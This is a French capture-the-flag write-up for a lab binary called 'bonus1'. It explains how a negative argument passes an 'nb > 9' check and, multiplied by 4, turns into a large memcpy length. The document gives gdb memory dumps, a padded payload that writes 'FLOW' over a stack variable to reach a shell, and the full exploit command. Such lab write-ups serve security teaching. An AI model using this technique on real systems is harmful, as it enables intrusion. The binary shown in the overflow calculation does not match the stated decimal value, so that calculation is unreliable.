# Bonus1 - Integer Overflow

## Contexte
Le programme prend deux arguments :
- Un nombre qui doit être inférieur à 9
- Une chaîne de caractères qui sera copiée
  
- En donnant 9 a memcpy on observe que nous n'avons toujours pas assez d'espace copier pour ecraser le retour de atoi pour y mettre 0x574f4c46
```nasm
(gdb) x/32wx 0xbffff414
0xbffff414:     0x41306141      0x61413161      0x33614132      0x41346141 ---> argv[2]
0xbffff424:     0x61413561      0x37614136      0x41386141      0x62413961 ---> argv[2]
0xbffff434:     0x31624130      0x080484b9      0x00000009
                                                      |
                                        atoi(9)<------+
```

- Il va falloir overflow l'int qui, apres une multiplication par 4 (decalage de 2bits a gauche) soit positif, assez grand pour overflow esp+0x3c

## Vulnérabilités

**Integer Overflow**
- La vérification `nb > 9` est effectuée
- Un nombre négatif peut passer la vérification
- Après multiplication par 4, le résultat peut devenir un nombre positif

## Exploitation

**Calcul de l'Integer Overflow**
- Valeur recherchée : -2147483632
- En binaire : 1000 0000 0000 0000 0000 0000 0000 0011
- Après multiplication par 4 : 0000 0000 0000 0000 0000 0000 0000 1100

## Processus d'Exploitation

1. Le nombre négatif passe la vérification `nb > 9`
2. La multiplication par 4 transforme ce nombre en valeur positive
3. memcpy copie suffisamment de données pour atteindre var_3c
4. La valeur 0x574f4c46 est écrite à l'emplacement de var_3c
5. La condition est validée et le shell est exécuté


**Construction du Payload**
```python
# Premier argument : integer overflow
"-2147483632"

# Second argument : padding + valeur cible
"A"*40 + "\x46\x4c\x4f\x57"  # "FLOW" en little-endian
```

**Commande d'Exploitation**
```bash
./bonus1 "-2147483632" $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```


